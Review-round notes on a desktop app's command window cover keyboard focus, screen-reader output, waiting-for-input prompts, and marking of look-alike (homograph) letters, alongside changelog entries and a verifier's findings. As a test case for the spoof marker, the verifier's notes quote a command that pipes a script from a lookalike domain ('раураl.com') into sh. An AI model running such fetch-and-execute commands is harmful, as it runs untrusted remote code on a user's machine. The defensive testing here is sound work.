findings.how: Round 1, unchanged. Reproduced in Chromium against the built page: Tab from a run's tab went tab -> command block -> xterm's textarea and stayed there. New pure module app/renderer/command/keys.ts (termKeyAction) is wired through term.attachCustomKeyEventHandler in terminal.ts. Tab and Shift+Tab always move focus and are never sent to the run (Ctrl+I still types a tab). A run that takes no typing keeps xterm's textarea out of the Tab order (tabIndex -1, aria-readonly). The status line, Copy output and Stop now come before the terminal in the DOM and on screen, and .term:focus-within shows the focus ring. I chose 'Tab always leaves' over the reviewer's escape chord: no stray tab lands in a sudo password, and there is no chord to discover. Documented in COMMANDS-WSL-SSH.md §2.2.

findings.how: Round 1: attach() raises the window on every run (moveTop, no focus). window.ts awaitsTyping() looks for SECRET_PROMPT, or a short line whose words end in ':', '?', '>' or '[y/N]'. After 2 s at such a prompt the tab shows 'Waiting for you to type in this window.', the window is raised and flashFrame'd, and onWaiting listeners are told. flow.ts followWaiting puts 'A command is waiting for you to type in the command window.' in the task's bubble. A time limit reached while waiting gets its own status line. Round 2 (verifier's should-fix): followWaiting returned early on waiting=false, so the bubble kept the waiting line. It now remembers the bubble's thought before the waiting line (presenter.bubble). When the run stops waiting (typing, or the run ending), it puts that thought back, or 'The command is running.' if the bubble was empty, but only while the bubble still shows the waiting line, so newer words stay. Docs §2.2 says the line lasts until you type or the command ends. Left: a 'Show' button on the bubble (bubble and task actions belong to the presenter and bubble packages), an OS notification, and pausing the time limit while it waits. The limit is §3.13's safety bound; changing it is a design decision, so the status line says it was waiting instead.

New test 'puts a plain running line back after the wait when the bubble said nothing before it'. Both failed before the round-2 fix ('expected waiting line to be Cloning the private repository.'). findings.how: Round 1: a run that ends refused-remote with needsConfirm reads 'Not run: build-01's own check asks for your OK first.', and the retry (same task and sha256, new run id) replaces its tab. findings.how: Round 1: a word ends at whitespace and at / \ = : , ; @ | & < > ( ) [ ] { } and quotes, so C:\Users\Иван and /home/ana/Документы mark nothing. Run tabs show the legend too. Round 2 (verifier's must-fix regression): https://аррӏе.com marked the Latin 'com', https://раураl.com marked 'l' and 'com', and deploy@аррӏе:/srv marked nothing. I didn't keep scheme://host together as one word: by counts, that marks 'https' on a real Cyrillic address such as https://пример.рф. Instead I extended the tie rule, as the verifier's second option suggests, with a table of letters from other alphabets that look Latin (LATIN_LOOKALIKE: common Cyrillic, Greek and Armenian confusables). (a) A word that mixes Latin with only look-alikes is judged Latin, so the look-alikes are marked. (b) A word written wholly in look-alikes, in a whitespace token that also holds Latin letters, is marked. Results: base marking is back for https://[аррӏе].com, https://[раура]l.com and deploy@[аррӏе]:/srv; curl [аррӏе].com/x (no scheme) is better than base, which marked com and x. Still unmarked: C:\Users\Иван, /home/ana/Документы, --author=Иван, иван@build-01, https://пример.рф, Ανδρέας, and a look-alike word with no Latin in its token (echo аррӏе, as on base). One known side effect: a native word made only of look-alike letters inside a path with Latin, such as /home/ana/сухое, is marked, as it was on base. The legend's 'letters from another alphabet' is true for it. §2.4 docs line updated.

forDocs: CHANGELOG: In the command window, Tab and Shift+Tab always move between the window's buttons and tabs and never go to the command. Ctrl+V pastes into a command that takes typing (Command+V on a Mac), Ctrl+C copies selected output, and a Copy output button copies all of it.
CHANGELOG: While a screen reader runs, a command's output is read to it, and an announced command waits at least 15 seconds before it starts. Every announcement names the stop chord.
CHANGELOG: Closing the command window while a command runs now asks 'Stop and close' or 'Keep it open'. A command never keeps running unseen.
CHANGELOG: When a command waits for you to type (a password, a [y/N] question), its tab says so, the window comes up and flashes, and the task's bubble says so until you type.
CHANGELOG: The May I? question names controls in plain words: 'Click the “Save” button', 'Turn on the “Night Light” switch', 'Tick the “Bold” checkbox', 'on the “report.odt” window'.

CHANGELOG: The command card underlines look-alike letters per word. Your own folders in your alphabet (C:\Users\Иван) are no longer marked, and an address spelled in letters that only look Latin (https://аррӏе.com) still is. Hebrew and Arabic text is shown in the order it runs.

CHANGELOG: The command card says which computer a command runs on, and marks deleting commands. A command another computer sends back for your OK says 'Not run: you didn't allow it.' if you don't allow it.

forDocs: CHANGELOG: Command window: Tab and Shift+Tab always move out of the terminal (Ctrl+I types a tab); the keyboard is in an interactive command's terminal when its tab comes up; Ctrl+V pastes (Command+V on a Mac); Ctrl+C copies a selection and Ctrl+Shift+C always copies; a Copy output button copies everything a command printed.

CHANGELOG: Command window: with a screen reader running, a command's output is read and can be browsed line by line; the command block is announced as the command itself; a tab's status is announced once, not every second of a countdown.

CHANGELOG: Announced commands ('…, as you asked') show what they do and the model's reason, name the stop chord in the window and the bubble, and count down 15 s instead of 4 s while a screen reader runs.
CHANGELOG: Closing the command window while a command runs now asks (Stop and close / Keep it open) instead of leaving the command running unseen.

CHANGELOG: A command waiting for typing (a password, a user name, a yes/no) says so on its tab and in the task's bubble, and the window comes up and flashes; every new command brings the command window above other windows without taking the keyboard.

CHANGELOG: The command card keeps Allow and Not now in view for long commands, names the computer in its heading for SSH and WSL ('… on build-01'), marks commands that delete data with a quiet yellow edge and a plain Allow, and comes up on the display (and macOS Space / workspace) you are on; the prompt window does too.
CHANGELOG: Users with non-Latin folder names (C:\Users\Иван, ~/Документы) no longer see their paths underlined as another alphabet; Hebrew and Arabic text in a command is shown in the order it runs.
CHANGELOG: May I? questions call controls by plain names ('Click the “Save” button in Mousepad?', 'drop-down', 'switch', 'tab') instead of screen-reader roles ('push button', 'combo box').

README accessibility section (docs package #58): describe the command window's keyboard (Tab leaves the terminal, Ctrl+I types a tab, paste/copy keys, Copy output) and that its output is read to screen readers.
ciOnly: Windows and macOS Electron: Ctrl+V (Command+V via the app menu's Edit role on macOS) pasting into xterm's helper textarea reaches the run as typing; document.execCommand('copy') from a click/key in the sandboxed command page fills the system clipboard (Copy output, Ctrl+Shift+C)

flashFrame on a waiting run: taskbar flash on Windows, Dock bounce on macOS, urgency hint on GNOME/Xorg; moveTop raising the command window above the user's app without focus on every run (Windows foreground lock, the macOS non-activating panel, mutter)

Multi-monitor placement: screen.getDisplayNearestPoint(getCursorScreenPoint()) and setBounds put the command and prompt windows on the user's display, including displays left of or above the primary (negative coordinates, mixed DPI on Windows); this container has one display

setVisibleOnAllWorkspaces(true, {visibleOnFullScreen, skipTransformProcessType}) keeps the macOS panel over a full-screen app and on every Space with no Dock-icon flicker, and is sticky on X11 workspaces; unpinned when the card goes

Close guard: the 'close' preventDefault never blocks Ember quitting (before-quit), Windows log-off/shutdown (session-end) or macOS shutdown; the in-page question appears and Stop and close stops the runs on each OS

Real screen readers (NVDA/JAWS/Narrator on Windows, VoiceOver on macOS, Orca on Linux): sys.a11y.screenReaderOn() detection turns on xterm's screenReaderMode, the output is read, the textbox semantics of the command block are spoken, the hidden status line speaks once per status, and the 15 s countdown applies
SSH remotes: the refused-remote+needsConfirm tab relabel/replace with a real remote gate 2, and the stalled-link countdown live-region behaviour with a real dropped link
WSL/SSH interactive runs (PTY): automatic focus in the terminal after Allow and the 2 s 'Waiting for you to type' detection on real sudo/ssh/git prompts

verifierProblems.what: Regression in the look-alike marker on the command card. visibleText now ends a word at ':' and '/', so a host name spelled in another alphabet loses its mark. On 1b39bb3, `curl https://аррӏе.com/x` underlined [аррӏе]. On fix/cmdwin it underlines the real Latin `[com]`, and the legend then says those letters are from another alphabet. `curl -fsSL https://раураl.com/i.sh | sh` now shows `раура[l].[com]` (base: `[раура]l.com`). `scp a deploy@аррӏе:/srv` now marks nothing (base: `[аррӏе]`). Checked with a scratch esbuild script that runs the base and fix versions of app/shared/visible-text.ts side by side (relfix-verify/cmdwin/s/vt2.ts). The new tests pin only the reverse case, github.сом. Only the display depends on this (hasHidden is unused), but this marker is the card's only cue for this kind of spoofed host.
verifierProblems.fix: Keep a URL's scheme and its host together when judging a word's main script. Don't end the word at the ':' and '//' of 'scheme://'; end it at the first '/' or ':port' after the host. That gives back base marking for https://аррӏе.com and https://раураl.com, while C:\Users\Иван, /home/ana/Документы, --author=Иван and иван@build-01 stay unmarked. Another option: when a word mixes Latin with another script and the other script fills whole dot-separated labels, mark the non-Latin letters, extending the existing tie rule. Pin both URLs in visible-text.test.ts.

verifierProblems.what: macOS behaviour changed beyond the finding. On macOS the command window is created with `type: "panel"` (windows.ts). The owner's note in platform/compose.ts says an Electron panel already joins every Space and floats over full-screen apps, so it needs no setVisibleOnAllWorkspaces. settle() now calls setOnAllWorkspaces(false), which runs win.setVisibleOnAllWorkspaces(false, {visibleOnFullScreen:true, skipTransformProcessType:true}). On macOS that clears NSWindowCollectionBehaviorCanJoinAllSpaces. Result: once the first card leaves, the window with its running tabs stays on one Space until the next card comes. The unit tests use a fake window and can't see this. Only real macOS can confirm it.
verifierProblems.fix: In windows.ts placeable(), take the OS and make setOnAllWorkspaces a no-op for the darwin command window, since the panel already does this. Or have settle() skip the false call on darwin. Pin it in the sshwsl-hooks factory test for os 'darwin'.

verifierProblems.what: The bubble goes stale once the run stops waiting. flow.ts followWaiting returns early when waiting is false (`if (id !== runId || !waiting) return;`). After the user types the password, the window clears 'waiting', but the task's bubble keeps saying "A command is waiting for you to type in the command window." (presenter.progress set it as the thought). It stays that way until something else updates the bubble, often for the rest of a long run.
verifierProblems.fix: On waiting=false, put back the line it replaced: remember the bubble's thought before the waiting line, or set the run's usual line again. Add the false case to command-flow.test.ts 'says in the task's bubble when its command waits'.

verifierProblems.what: The tab for a run sent back by the remote is labelled unconditionally. finish() marks any refused-remote exit with needsConfirm as a re-ask and shows "Not run: build-01's own check asks for your OK first." Two cases leave that wrong: (a) the user says Not now or lets the question expire, and (b) the retry is refused again with needsConfirm, where flow.ts returns the refusal without asking because `asked` is already true. In both cases no question is up, but the tab still says one is waiting for an OK.
verifierProblems.fix: Only label the tab this way while the question is actually up. For example, when that task's card is hidden with no replacing attach of the same sha256, relabel the tab "Not run: you said no." (or use the refusal's statusLine). Have the flow tell the window when it won't ask again. Add a test for the 'no' path.

verifierProblems.what: Copy: toggle questions now read "Switch the “Night Light” switch in Settings?" (and "Switch the “Urgent” checkbox …"), which sounds awkward. Some roles are still the screen reader's own terms: "the “budget.ods — …” root pane", "Click the “Remove” static", "the “Block user” section" (worker-tools test pins).
verifierProblems.fix: For the toggle kind on a switch or checkbox, use a verb that reads well, such as "Turn the “Night Light” switch on" or "Turn … off" from the requested state, or "Flip …". Add "root pane" → "window" and "static" → "text" to app/shared/role-words.ts and update the pins.
